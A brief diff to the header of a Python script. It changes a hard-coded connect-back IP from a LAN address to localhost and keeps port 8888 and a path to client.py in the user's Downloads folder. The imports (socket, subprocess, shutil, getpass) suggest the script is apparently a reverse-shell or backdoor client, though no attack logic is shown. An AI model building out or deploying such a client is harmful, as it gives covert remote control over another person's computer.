@@ -1,7 +1,7 @@
 import socket,subprocess,os,shutil,getpass
 
 #Globals
-IP = "192.168.178.185"
+IP = "127.0.0.1"
 PORT = 8888
 user = getpass.getuser()
 SourcePath = (f"C:/Users/{user}/Downloads/client.py")
